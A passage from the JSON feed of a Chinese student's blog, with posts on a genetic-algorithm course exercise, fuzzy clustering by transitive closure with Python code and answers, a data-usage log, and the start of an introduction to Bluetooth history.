newX[i] = x[:center] + y[center:] # newX的元素都是字符串，可以直接用+号拼接 newX[j] = y[:center] + x[center:] # 修改代码处 np.append(newX,ak) np.append(probs,max_probs ) # 修改代码处 return newX 第六题代码思路基于源代码与教材，对代码进行了如下修改： 因为要求二元函数的最大值，所以需要两个变量，x与y。这样一来，所需的种群就要有两批，设为chroms_x与chroms_y去对应，接下来需要对chroms1与chroms2进行编码和解码。代码如下。 12345678910111213141516171819202122232425# 初始化原始种群population_x = np.random.uniform(-2.9, 12.0, 10) # 在[-1,2)上以均匀分布生成10个浮点数，做为初始种群population_y = np.random.uniform(4.2, 5.7, 10)def encode_x(population, _min=-2.9, _max=12.0, scale=2**21, binary_len=21): # population必须为float类型，否则精度不能保证 # 标准化，使所有数据位于0和1之间,乘以scale使得数据间距拉大以便用二进制表示 normalized_data = (population-_min) / (_max-_min) * scale # 转成二进制编码 binary_data = np.array([np.binary_repr(x, width=binary_len) for x in normalized_data.astype(int)]) return binary_datadef encode_y(population, _min=4.2, _max=5.7, scale=2**18, binary_len=18): # population必须为float类型，否则精度不能保证 # 标准化，使所有数据位于0和1之间,乘以scale使得数据间距拉大以便用二进制表示 normalized_data = (population-_min) / (_max-_min) * scale # 转成二进制编码 binary_data = np.array([np.binary_repr(x, width=binary_len) for x in normalized_data.astype(int)]) return binary_datadef decode_x(popular_gene, _min=-2.9, _max=12.0, scale=2**21): # 先把x从2进制转换为10进制，表示这是第几份 # 乘以每份长度（长度/份数）,加上起点,最终将一个2进制数，转换为x轴坐标 return np.array([(int(x, base=2)/scale*14.9)+_min for x in popular_gene])def decode_y(popular_gene, _min=4.2, _max=5.7, scale=2**18): # 先把x从2进制转换为10进制，表示这是第几份 # 乘以每份长度（长度/份数）,加上起点,最终将一个2进制数，转换为x轴坐标 return np.array([(int(x, base=2)/scale*1.5)+_min for x in popular_gene]) chroms_x的染色体长度为21，chroms_y的长度为18，在编写编码和解码的代码中，分别要写两个函数，有所不同。按题目要求，需要将两段种群基因拼接起来，所以还需要设置第三个拼接后的种群chroms_v，以及对应的编码函数。变异后，需要将两个种群重新拆离，生成chroms_x和chroms_y去求函数。这里就需要一个解码过程。代码如下： 1234567891011121314151617def encode_v(population_x,population_y): chroms_x = encode_x(population_x) chroms_y = encode_y(population_y) chroms_v = np.char.add(chroms_x,chroms_y) return chroms_vdef decode_v(chroms_v): chroms_x = [] chroms_y = [] for chv in chroms_v: tempx = chv[:21] tempy = chv[21:] chroms_x.append(tempx) chroms_y.append(tempy) dechroms_x = decode_x(chroms_x) dechromx_y = decode_y(chroms_y) return dechroms_x,dechromx_y 变异过程与源代码无异，只是将中心交叉改为了随机交叉。 12345678910111213141516171819202122def Select_Crossover(chroms, fitness, prob=0.6): # 选择和交叉 probs = fitness/np.sum(fitness) # 各个个体被选择的概率 probs_cum = np.cumsum(probs) # 概率累加分布 each_rand = np.random.uniform(size=len(fitness)) # 得到10个随机数，0到1之间 # 轮盘赌，根据随机概率选择出新的基因编码 # 对于each_rand中的每个随机数，找到被轮盘赌中的那个染色体 newX = np.array([chroms[np.where(probs_cum &gt; rand)[0][0]] for rand in each_rand]) # 繁殖，随机配对（概率为0.6) # 6这个数字怎么来的，根据遗传算法，假设有10个数，交叉概率为0.6，0和1一组，2和3一组。。。8和9一组，每组扔一个0到1之间的数字 # 这个数字小于0.6就交叉，则平均下来应有三组进行交叉，即6个染色体要进行交叉 pairs = np.random.permutation(int(len(newX)*prob//2*2)).reshape(-1, 2) # 产生6个随机数，乱排一下，分成二列 point = np.random.randint(38) # 交叉方法采用随即交叉法 for i, j in pairs: # 在中间位置交叉 x, y = newX[i], newX[j] newX[i] = x[:point] + y[point:] # newX的元素都是字符串，可以直接用+号拼接 newX[j] = y[:point] + x[point:] return newX 求出函数，要将数据可视化，我们作三维图进行对比表示。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# 画出迭代过程中的寻求二元函数极大值的变化图象def DrawMax(x_data,y_data): plt.figure() ax = plt.gca() ax.set_xlim(0,1000) ax.set_ylim(0,40) ax.locator_params(&#x27;x&#x27;,nbins=10) ax.locator_params(&#x27;y&#x27;,nbins=8) plt.plot(x_data,y_data) plt.show()# 画出对比函数图像def DrawTwoChroms(chroms1, chroms2, fitfun): # 画2幅图，左边是旧种群，右边是新种群，观察平行的两幅图可以看出有没有差异 # 新建一个画布 figure = plt.figure() # 新建一个3d绘图对象 ax1 = figure.add_subplot(1,2,1,projection=&#x27;3d&#x27;) ax2 = figure.add_subplot(1,2,2,projection=&#x27;3d&#x27;) # 生成x, y 的坐标集 (-2,2) 区间，间隔为 0.1 x = np.linspace(-2.9, 12.0, 20) y = np.linspace(4.2, 5.7, 18) # 生成网格矩阵 X, Y = np.meshgrid(x,y) # 定义x,y 轴名称 plt.xlabel(&quot;x&quot;) plt.ylabel(&quot;y&quot;) # 设置间隔和颜色 #ax.plot_wireframe(X,Y,Z) ax1.set_zlim(0, 40) ax2.set_zlim(0, 40) dechroms_x,dechroms_y = decode_v(chroms1) fitness = fitfun(dechroms_x,dechroms_y) ax1.plot_surface(X, Y, fitfun(X,Y), rstride=3, cstride=2, cmap=&quot;rainbow&quot;,alpha=0.65) ax1.plot(dechroms_x,dechroms_y,fitness,&#x27;k.&#x27;) newdechroms_x,newdechroms_y = decode_v(chroms2) fitness = fitfun(newdechroms_x,newdechroms_y) ax2.plot_surface(X, Y, fitfun(X,Y), rstride=3, cstride=2, cmap=&quot;rainbow&quot;,alpha=0.65) ax2.plot(newdechroms_x,newdechroms_y,fitness,&#x27;k.&#x27;) plt.show() 最后看一下主函数 123456789101112131415161718192021222324252627282930313233np.random.seed(0)population_x = np.random.uniform(-2.9, 12.0, 100) # 在[-1,2)上以均匀分布生成10个浮点数，做为初始种群population_y = np.random.uniform(4.2, 5.7, 100)chroms_v = encode_v(population_x,population_y)x_data=[]for i in range(1001): x_data.append(i)y_data = []for i in range(1000): dechroms_x,dechroms_y = decode_v(chroms_v) fitness = fun(dechroms_x,dechroms_y) fitmax = np.max(fitness) y_data.append(fitmax) fitness = fitness - fitness.min() + 0.000001 # 保证所有的都为正 newchroms_v = Mutate(Select_Crossover(chroms_v, fitness)) if i % 300 == 1: DrawTwoChroms(chroms_v, newchroms_v, fun) chroms_v = newchroms_vdechroms_x,dechroms_y = decode_v(chroms_v)fitness = fun(dechroms_x,dechroms_y)fitmax = np.max(fitness)y_data.append(fitmax)DrawTwoChroms(chroms_v, newchroms_v, fun)print(len(y_data))DrawMax(x_data,y_data)print(&#x27;函数的最大值为：&#x27;)print(np.max(fitness)) 完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251import numpy as npimport matplotlib.pyplot as pltfrom mpl_toolkits.mplot3d import Axes3Ddef fun(x,y): return 21.5+x*np.sin(4*x*np.pi)+y*np.sin(20*y*np.pi)Xs = np.linspace(-2.9, 12.0, 100)Ys = np.linspace(4.2, 5.7, 100)np.random.seed(0) # 令随机数种子=0，确保每次取得相同的随机数# 初始化原始种群population_x = np.random.uniform(-2.9, 12.0, 10) # 在[-1,2)上以均匀分布生成10个浮点数，做为初始种群population_y = np.random.uniform(4.2, 5.7, 10)for popx, popy, fit in zip(population_x,population_y,fun(population_x,population_y)): print(&quot;x=%5.2f, y=%5.2f, fit=%.2f&quot; % (popx,popy,fit))# 新建一个画布figure = plt.figure()# 新建一个3d绘图对象ax = Axes3D(figure)# 生成x, y 的坐标集 (-2,2) 区间，间隔为 0.1x = np.linspace(-2.9, 12.0, 20)y = np.linspace(4.2, 5.7, 17)# 生成网格矩阵X, Y = np.meshgrid(x,y)# 定义x,y 轴名称plt.xlabel(&quot;x&quot;)plt.ylabel(&quot;y&quot;)Z= 21.5+X*np.sin(4*X*np.pi)+Y*np.sin(20*Y*np.pi)# 设置间隔和颜色ax.plot_surface(X, Y, Z, rstride=1, cstride=1, cmap=&quot;rainbow&quot;,alpha=0.5)#ax.plot_wireframe(X,Y,Z)ax.set_zlim(0, 40)ax.plot(population_x,population_y,fun(population_x,population_y),&#x27;ko&#x27;)# 展示plt.show()def encode_x(population, _min=-2.9, _max=12.0, scale=2**21, binary_len=21): # population必须为float类型，否则精度不能保证 # 标准化，使所有数据位于0和1之间,乘以scale使得数据间距拉大以便用二进制表示 normalized_data = (population-_min) / (_max-_min) * scale # 转成二进制编码 binary_data = np.array([np.binary_repr(x, width=binary_len) for x in normalized_data.astype(int)]) return binary_datadef encode_y(population, _min=4.2, _max=5.7, scale=2**18, binary_len=18): # population必须为float类型，否则精度不能保证 # 标准化，使所有数据位于0和1之间,乘以scale使得数据间距拉大以便用二进制表示 normalized_data = (population-_min) / (_max-_min) * scale # 转成二进制编码 binary_data = np.array([np.binary_repr(x, width=binary_len) for x in normalized_data.astype(int)]) return binary_datadef encode_v(population_x,population_y): chroms_x = encode_x(population_x) chroms_y = encode_y(population_y) chroms_v = np.char.add(chroms_x,chroms_y) return chroms_v # 染色体英文(chromosome)# chroms_x = encode_x(population_x)# chroms_y = encode_y(population_y)chroms_v = encode_v(population_x,population_y)print(chroms_v)# for popx, popy, chromx_x, chromx_y, fit in zip(population_x, population_y, chroms_x, chroms_y, fun(population_x,population_y)):# print(&quot;x=%.2f, x=%.2f, chrom_x=%s, chrom_y=%s, fit=%.2f&quot; % (popx, popy, chromx_x, chromx_y, fit))def decode_x(popular_gene, _min=-2.9, _max=12.0, scale=2**21): # 先把x从2进制转换为10进制，表示这是第几份 # 乘以每份长度（长度/份数）,加上起点,最终将一个2进制数，转换为x轴坐标 return np.array([(int(x, base=2)/scale*14.9)+_min for x in popular_gene])def decode_y(popular_gene, _min=4.2, _max=5.7, scale=2**18): # 先把x从2进制转换为10进制，表示这是第几份 # 乘以每份长度（长度/份数）,加上起点,最终将一个2进制数，转换为x轴坐标 return np.array([(int(x, base=2)/scale*1.5)+_min for x in popular_gene])def decode_v(chroms_v): chroms_x = [] chroms_y = [] for chv in chroms_v: tempx = chv[:21] tempy = chv[21:] chroms_x.append(tempx) chroms_y.append(tempy) dechroms_x = decode_x(chroms_x) dechromx_y = decode_y(chroms_y) return dechroms_x,dechromx_ydechroms_x,dechroms_y = decode_v(chroms_v)print(dechroms_x)print(dechroms_y)fitness = fun(dechroms_x,dechroms_y)print(fitness)# for popx, popy, chromx_x, chromx_y, dechromx_x, dechromx_y, fit in zip(population_x, population_y, chroms_x, chroms_y, fun(population_x,population_y)):# print(&quot;x=%.2f, x=%.2f, chrom_x=%s, chrom_y=%s, dechrom_x=%.2f, dechrom_y=%.2f, fit=%.2f&quot; % (popx, popy, chromx_x, chromx_y, dechromx_x, dechromx_y, fit))fitness = fitness - fitness.min() + 0.000001 # 保证所有的都为正print(fitness)def Select_Crossover(chroms, fitness, prob=0.6): # 选择和交叉 probs = fitness/np.sum(fitness) # 各个个体被选择的概率 probs_cum = np.cumsum(probs) # 概率累加分布 each_rand = np.random.uniform(size=len(fitness)) # 得到10个随机数，0到1之间 # 轮盘赌，根据随机概率选择出新的基因编码 # 对于each_rand中的每个随机数，找到被轮盘赌中的那个染色体 newX = np.array([chroms[np.where(probs_cum &gt; rand)[0][0]] for rand in each_rand]) # 繁殖，随机配对（概率为0.6) # 6这个数字怎么来的，根据遗传算法，假设有10个数，交叉概率为0.6，0和1一组，2和3一组。。。8和9一组，每组扔一个0到1之间的数字 # 这个数字小于0.6就交叉，则平均下来应有三组进行交叉，即6个染色体要进行交叉 pairs = np.random.permutation(int(len(newX)*prob//2*2)).reshape(-1, 2) # 产生6个随机数，乱排一下，分成二列 point = np.random.randint(38) # 交叉方法采用随即交叉法 for i, j in pairs: # 在中间位置交叉 x, y = newX[i], newX[j] newX[i] = x[:point] + y[point:] # newX的元素都是字符串，可以直接用+号拼接 newX[j] = y[:point] + x[point:] return newXchroms_v = Select_Crossover(chroms_v, fitness)dechroms_x,dechroms_y = decode_v(chroms_v)fitness = fun(dechroms_x,dechroms_y)# for gene, dec, fit in zip(chroms, dechroms, fitness):# print(&quot;chrom=%s, dec=%5.2f, fit=%.2f&quot; % (gene, dec, fit))# 对比一下选择和交叉之后的结果# fig, (axs1, axs2) = plt.subplots(1, 2, figsize=(14, 5))# axs1.plot(Xs, fun(Xs))# axs1.plot(population, fun(population), &#x27;o&#x27;)# axs2.plot(Xs, fun(Xs))# axs2.plot(dechroms, fitness, &#x27;*&#x27;)# plt.show()# 输入一个原始种群1，输出一个变异种群2 函数参数中的冒号是参数的类型建议符，告诉程序员希望传入的实参的类型。函数后面跟着的箭头是函数返回值的类型建议符，用来说明该函数返回的值是什么类型。def Mutate(chroms: np.array): prob = 0.1 # 变异的概率 clen = len(chroms[0]) # chroms[0]=&quot;111101101 000010110&quot; 字符串的长度=18 m = &#123;&#x27;0&#x27;: &#x27;1&#x27;, &#x27;1&#x27;: &#x27;0&#x27;&#125; # m是一个字典，包含两对：第一对0是key而1是value；第二对1是key而0是value newchroms = [] # 存放变异后的新种群 each_prob = np.random.uniform(size=len(chroms)) # 随机10个数 for i, chrom in enumerate(chroms): # enumerate的作用是整一个i出来 if each_prob[i] &lt; prob: # 如果要进行变异(i的用处在这里) pos = np.random.randint(clen) # 从18个位置随机中找一个位置，假设是7 # 0~6保持不变，8~17保持不变，仅将7号翻转，即0改为1，1改为0。注意chrom中字符不是1就是0 chrom = chrom[:pos] + m[chrom[pos]] + chrom[pos+1:] newchroms.append(chrom) # 无论if是否成立，都在newchroms中增加chroms的这个元素 return np.array(newchroms) # 返回变异后的种群newchroms_v = Mutate(chroms_v)def DrawMax(x_data,y_data): plt.figure() ax = plt.gca() ax.set_xlim(0,1000) ax.set_ylim(0,40) ax.locator_params(&#x27;x&#x27;,nbins=10) ax.locator_params(&#x27;y&#x27;,nbins=8) plt.plot(x_data,y_data) plt.show()def DrawTwoChroms(chroms1, chroms2, fitfun): # 画2幅图，左边是旧种群，右边是新种群，观察平行的两幅图可以看出有没有差异 # 新建一个画布 figure = plt.figure() # 新建一个3d绘图对象 ax1 = figure.add_subplot(1,2,1,projection=&#x27;3d&#x27;) ax2 = figure.add_subplot(1,2,2,projection=&#x27;3d&#x27;) # 生成x, y 的坐标集 (-2,2) 区间，间隔为 0.1 x = np.linspace(-2.9, 12.0, 20) y = np.linspace(4.2, 5.7, 18) # 生成网格矩阵 X, Y = np.meshgrid(x,y) # 定义x,y 轴名称 plt.xlabel(&quot;x&quot;) plt.ylabel(&quot;y&quot;) # 设置间隔和颜色 #ax.plot_wireframe(X,Y,Z) ax1.set_zlim(0, 40) ax2.set_zlim(0, 40) dechroms_x,dechroms_y = decode_v(chroms1) fitness = fitfun(dechroms_x,dechroms_y) ax1.plot_surface(X, Y, fitfun(X,Y), rstride=3, cstride=2, cmap=&quot;rainbow&quot;,alpha=0.65) ax1.plot(dechroms_x,dechroms_y,fitness,&#x27;k.&#x27;) newdechroms_x,newdechroms_y = decode_v(chroms2) fitness = fitfun(newdechroms_x,newdechroms_y) ax2.plot_surface(X, Y, fitfun(X,Y), rstride=3, cstride=2, cmap=&quot;rainbow&quot;,alpha=0.65) ax2.plot(newdechroms_x,newdechroms_y,fitness,&#x27;k.&#x27;) plt.show()# 对比一下变异前后的结果# DrawTwoChroms(chroms, newchroms, fun)# 上述代码只是执行了一轮，这里反复迭代np.random.seed(0)population_x = np.random.uniform(-2.9, 12.0, 100) # 在[-1,2)上以均匀分布生成10个浮点数，做为初始种群population_y = np.random.uniform(4.2, 5.7, 100)# 这次多找一些点chroms_v = encode_v(population_x,population_y)x_data=[]for i in range(1001): x_data.append(i)y_data = []for i in range(1000): dechroms_x,dechroms_y = decode_v(chroms_v) fitness = fun(dechroms_x,dechroms_y) fitmax = np.max(fitness) y_data.append(fitmax) fitness = fitness - fitness.min() + 0.000001 # 保证所有的都为正 newchroms_v = Mutate(Select_Crossover(chroms_v, fitness)) if i % 300 == 1: DrawTwoChroms(chroms_v, newchroms_v, fun) chroms_v = newchroms_vdechroms_x,dechroms_y = decode_v(chroms_v)fitness = fun(dechroms_x,dechroms_y)fitmax = np.max(fitness)y_data.append(fitmax)DrawTwoChroms(chroms_v, newchroms_v, fun)print(len(y_data))DrawMax(x_data,y_data)print(&#x27;函数的最大值为：&#x27;)print(np.max(fitness)) 第六题代码来源：19级大数据三班 wcx","comments":true,"categories":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"计算智能","slug":"计算智能","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD/"}]},{"title":"计算智能课程设计(基于传递闭包的模糊聚类)","date":"2021-12-02T05:05:37.000Z","path":"2021/12/02/计算智能课程设计-基于传递闭包的模糊聚类/","text":"写在前面今天上午写完了以人事招聘为例的误差反向传播算法，下午要写的是“基于传递闭包的模糊聚类”。青春易逝，时间珍贵，要抓紧写完代码，这样就可以没有后顾之忧的和npy出去玩了。2021.12.2 实验题目基于传递闭包的模糊聚类 背景知识 示例代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121import numpy as npnp.set_printoptions(precision=2) # 设置矩阵输出精度,保留两位小数def MaxNormalization(a): &quot;&quot;&quot; 采用最大值规格化法将数据规格化为 &quot;&quot;&quot; c = np.zeros_like(a, dtype=float) for j in range(c.shape[1]): # 遍历c的列 for i in range(c.shape[0]): # 遍历c的列 c[i, j] = a[i, j]/np.max(a[:, j]) return cdef FuzzySimilarMatrix(a): &quot;&quot;&quot; 用最大最小法构造得到模糊相似矩阵 &quot;&quot;&quot; a = MaxNormalization(a) # 用标准化后的数据 c = np.zeros((a.shape[0], a.shape[0]), dtype=float) mmax = [] mmin = [] for i in range(c.shape[0]): # 遍历c的行 for j in range(c.shape[0]): # 遍历c的行 mmax.extend([np.fmax(a[i, :], a[j, :])]) # 取i和和j行的最大值,即求i行和j行的并 mmin.extend([np.fmin(a[i, :], a[j, :])]) # 取i和和j行的最大值,即求i行和j行的交 for i in range(len(mmax)): mmax[i] = np.sum(mmax[i]) # 求并的和 mmin[i] = np.sum(mmin[i]) # 求交的和 mmax = np.array(mmax).reshape(c.shape[0], c.shape[1]) # 变换为与c同型的矩阵 mmin = np.array(mmin).reshape(c.shape[0], c.shape[1]) # 变换为与c同型的矩阵 for i in range(c.shape[0]): # 遍历c的行 for j in range(c.shape[1]): # 遍历c的列 c[i, j] = mmin[i, j]/mmax[i, j] # 赋值相似度 return cdef MatrixComposition(a, b): &quot;&quot;&quot; 合成模糊矩阵a和模糊矩阵b &quot;&quot;&quot; a, b = np.array(a), np.array(b) c = np.zeros_like(a.dot(b)) for i in range(a.shape[0]): # 遍历a的行元素 for j in range(b.shape[1]): # 遍历b的列元素 empty = [] for k in range(a.shape[1]): empty.append(min(a[i, k], b[k, j])) # 行列元素比小 c[i, j] = max(empty) # 比小结果取大 return cdef TransitiveClosure(a): &quot;&quot;&quot; 平方法合成传递闭包 &quot;&quot;&quot; a = FuzzySimilarMatrix(a) # 用模糊相似矩阵 c = a while True: m = c c = MatrixComposition(MatrixComposition(a, c), MatrixComposition(a, c)) if (c == m).all(): # 闭包条件 return np.around(c, decimals=2) # 返回传递闭包,四舍五入,保留两位小数 break else: continuedef CutSet(a): &quot;&quot;&quot; 水平截集 &quot;&quot;&quot; a = TransitiveClosure(a) # 用传递闭包 return np.sort(np.unique(a).reshape(-1))[::-1]def get_classes(temp_pairs): lists = [] for item1 in temp_pairs: temp_list = [] for item2 in temp_pairs: if item1[0] == item2[1]: temp_list.append(item2[0]) lists.append(list(set(temp_list))) return(list(np.unique(lists)))def Result(a): &quot;&quot;&quot; 模糊聚类结果 &quot;&quot;&quot; lambdas = CutSet(a) a = TransitiveClosure(a) classes = [] for lam in lambdas: if lam == lambdas[0]: classes.append([[a] for a in range(len(a))]) else: pairs = np.argwhere(a &gt;= lam) classes.append(get_classes(pairs)) return classesdef main(): &quot;&quot;&quot; 特性指标矩阵 &quot;&quot;&quot; input = np.array([[17, 15, 14, 15, 16], [18, 16, 13, 14, 12], [18, 18, 19, 17, 18], [16, 18, 16, 15, 18]]) print(&quot;特性指标矩阵\\n&quot;, input) print(&quot;\\n采用最大值规格化法将数据规格化为\\n&quot;, MaxNormalization(input)) print(&quot;\\n用最大最小法构造得到模糊相似矩阵\\n&quot;, FuzzySimilarMatrix(input)) print(&quot;\\n平方法合成传递闭包\\n&quot;, TransitiveClosure(input)) print(&quot;\\n水平截集为\\n&quot;, CutSet(input)) print(&quot;\\n模糊聚类结果\\n&quot;, Result(input))if __name__ == &quot;__main__&quot;: main() 实验内容运行和理解示例代码，回答下列问题： 1）为什么按最大最小法得到的一定是一个方阵？且一定是自反方阵？且一定是对称方阵？ 2）为什么可以根据水平截集对数据进行分类？（提示：一个等价关系唯一确定一个划分） 3）请解释代码 72 行中两个-1 的含义： 1return np.sort(np.unique(a).reshape(-1))[::-1] 4）在平方法的代码实现中，如何判断平方后的矩阵是否满足传递性？为什么可以这么判断？ 5）请修改代码，将最大最小法替换为算术平均最小法。这会改变最终的聚类结果么？ 实验结果与分析第一题1）为什么按最大最小法得到的一定是一个方阵？且一定是自反方阵？且一定是对称方阵？ 因为按照最大最小法来做，当i==j时，有： 所以有 故，得到的方阵一定是自反方阵 对于 有 故它一定是对称方阵。 第二题2）为什么可以根据水平截集对数据进行分类？（提示：一个等价关系唯一确定一个划分） 由于模糊相似矩阵本身已经是自反的、对称的，其传递闭包又是传递的，则其传递闭包一定是模糊等价矩阵，可以决定一个划分。 第三题3）请解释代码 72 行中两个-1 的含义： 前面的-1是自动推断行数或列数 后面的-1是逆序 1return np.sort(np.unique(a).reshape(-1))[::-1] 第四题4）在平方法的代码实现中，如何判断平方后的矩阵是否满足传递性？为什么可以这么判断？ 判断代码如下： 1FuzzySimilarMatrix(a)==MatrixComposition(MatrixComposition(a, c), MatrixComposition(a, c)).all 从模糊相似矩阵得到传递闭包，采用的方法是平方法，具体方法是：把一个相似矩阵，进行自乘操作，得到并且检验是否满足传递性，如果满足，则停止。 原理： 第五题5）请修改代码，将最大最小法替换为算术平均最小法。这会改变最终的聚类结果么？ 修改代码： 1234567891011121314151617181920212223def FuzzySimilarMatrix(a): &quot;&quot;&quot; 用最大最小法构造得到模糊相似矩阵 &quot;&quot;&quot; a = MaxNormalization(a) # 用标准化后的数据 c = np.zeros((a.shape[0], a.shape[0]), dtype=float) mmax = [] mmin = [] for i in range(c.shape[0]): # 遍历c的行 for j in range(c.shape[0]): # 遍历c的行 ###修改处 mmax.extend([a[i, :]+ a[j, :]]) # 取i和和j行的最大值,即求i行和j行的并 mmin.extend([np.fmin(a[i, :], a[j, :])]) # 取i和和j行的最大值,即求i行和j行的交 for i in range(len(mmax)): ###修改处 mmax[i] = np.sum(mmax[i])/2 # 求并的和 mmin[i] = np.sum(mmin[i]) # 求交的和 mmax = np.array(mmax).reshape(c.shape[0], c.shape[1]) # 变换为与c同型的矩阵 mmin = np.array(mmin).reshape(c.shape[0], c.shape[1]) # 变换为与c同型的矩阵 for i in range(c.shape[0]): # 遍历c的行 for j in range(c.shape[1]): # 遍历c的列 c[i, j] = mmin[i, j]/mmax[i, j] # 赋值相似度 return c 会改变最终的聚类结果。","comments":true,"categories":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"计算智能","slug":"计算智能","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD/"}]},{"title":"课程设计流量计数","date":"2021-12-01T12:12:28.000Z","path":"2021/12/01/课程设计流量计数/","text":"基于蓝牙共享网络技术的上网方式计算智能课程设计2021.12.1使用前耗费流量：1.50G 使用后耗费流量：1.78G 2021.12.2上午使用前耗费流量：2.46G 上午使用后耗费流量：3.54G 下午使用前耗费流量：3.54G 下午使用后耗费流量：4.05G 2021.12.4上午使用前耗费流量：6.65G 上午使用后耗费流量：7.58G 下午使用前耗费流量：7.58G 下午使用后耗费流量：8.22G 2021.12.6上午使用前耗费流量：10.91G 上午使用后耗费流量：","comments":true,"categories":[{"name":"编程随想","slug":"编程随想","permalink":"http://1905060202.github.io/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/"}],"tags":[{"name":"人生","slug":"人生","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E7%94%9F/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}]},{"title":"无线通信技术之Bluetooth","date":"2021-12-01T10:22:58.000Z","path":"2021/12/01/蓝牙技术/","text":"Bluetooth Technology写在前面大三上学期，2021年末，我们要做计算智能课程设计，但我所在的那个实验室没有校园网。虽说没有网络也能跑实验，但在出现bug要上网找解决方案的时候就很麻烦。我试着用手机热点给电脑提供网络，很可惜，我的电脑前段时间因为代理软件的原因，网络被重置，有的驱动和服务我还没调配，只能连校园网，却连不上手机热点。我看iPhone提示还能通过bluetooth上网，于是我尝试了这个方法，果然奏效了。在电脑连上网络的那一刻，我十分兴奋，同时也十分好奇。身为工科生，探索未知本身就是一件极具吸引力的事情，况且我还是大数据专业，与计算机和通信有着千丝万缕的联系，本着求知本能，我开始探索bluetooth的原理。 Bluetooth IntroductionBluetooth is a short-range wireless technology standard that is used for exchanging data between fixed and mobile devices over short distances using UHF radio waves in the ISM bands, from 2.402 GHz to 2.48 GHz, and building personal area networks (PANs).[3] It was originally conceived as a wireless alternative to RS-232 data cables. It is mainly used as an alternative to wire connections, to exchange files between nearby portable devices and connect cell phones and music players with wireless headphones. In the most widely used mode, transmission power is limited to 2.5 milliwatts, giving it a very short range of up to 10 meters (30 feet). HistoryThe development of the “short-link” radio technology, later named Bluetooth, was initiated in 1989 by Nils Rydbeck, CTO at Ericsson Mobile in Lund, Sweden. The purpose was to develop wireless headsets, according to two inventions by Johan Ullman, SE 8902098-6, issued 1989-06-12 and SE 9202239, issued 1992-07-24. Nils Rydbeck tasked Tord Wingren with specifying and Dutchman Jaap Haartsen and Sven Mattisson with developing.[16] Both were working for Ericsson in Lund.[17] Principal design and development began in 1994 and by 1997 the team had a workable solution.[18] From 1997 Örjan Johansson became the project leader and propelled the technology and standardization.[19][20][21][22] In 1997, Adalio Sanchez, then head of IBM ThinkPad product R&amp;D, approached Nils Rydbeck about collaborating on integrating a mobile phone into a ThinkPad notebook. The two assigned engineers from Ericsson and IBM to study the idea. The conclusion was that power consumption on cellphone technology at that time was too high to allow viable integration into a notebook and still achieve adequate battery life. Instead, the two companies agreed to integrate Ericsson’s short-link technology on both a ThinkPad notebook and an Ericsson phone to accomplish the goal. Since neither IBM ThinkPad notebooks nor Ericsson phones were the market share leaders in their respective markets at that time, Adalio Sanchez and Nils Rydbeck agreed to make the short-link technology an open industry standard to permit each player maximum market access. Ericsson contributed the short-link radio technology, and IBM contributed patents around the logical layer. Adalio Sanchez of IBM then recruited Stephen Nachtsheim of Intel to join and then Intel also recruited Toshiba and Nokia. In May 1998, the Bluetooth SIG was launched with IBM and Ericsson as the founding signatories and a total of five members: Ericsson, Intel, Nokia, Toshiba and IBM. The first consumer Bluetooth device was launched in 1999. It was a hands-free mobile headset that earned the “Best of show Technology Award” at COMDEX. The first Bluetooth mobile phone was the Ericsson T36 but it was the revised T39 model that actually made it to store shelves in 2001. In parallel, IBM introduced the IBM ThinkPad A30 in October 2001 which was the first notebook with integrated Bluetooth. Bluetooth’s early incorporation into consumer electronics products continued at Vosi Technologies in Costa Mesa, California, USA, initially overseen by founding members Bejan Amini and Tom Davidson. Vosi Technologies had been created by real estate developer Ivano Stegmenga, with United States Patent 608507, for communication between a cellular phone and a vehicle’s audio system. At the time, Sony/Ericsson had only a minor market share in the cellular phone market, which was dominated in the US by Nokia and Motorola. Due to ongoing negotiations for an intended licensing agreement with Motorola beginning in the late 1990s, Vosi could not publicly disclose the intention, integration and initial development of other enabled devices which were to be the first “Smart Home” internet connected devices. Vosi needed a means for the system to communicate without a wired connection from the vehicle to the other devices in the network. Bluetooth was chosen, since WiFi was not yet readily available or supported in the public market. Vosi had begun to develop the Vosi Cello integrated vehicular system and some other internet connected devices, one of which was intended to be a table-top device named the Vosi Symphony, networked with Bluetooth. Through the negotiations with Motorola, Vosi introduced and disclosed its intent to integrate Bluetooth in its devices. In the early 2000s a legal battle ensued between Vosi and Motorola, which indefinitely suspended release of the devices. Later, Motorola implemented it in their devices which initiated the significant propagation of Bluetooth in the public market due to its large market share at the time. Communication and connectionA master BR/EDR Bluetooth device can communicate with a maximum of seven devices in a piconet (an ad hoc computer network using Bluetooth technology), though not all devices reach this maximum. The 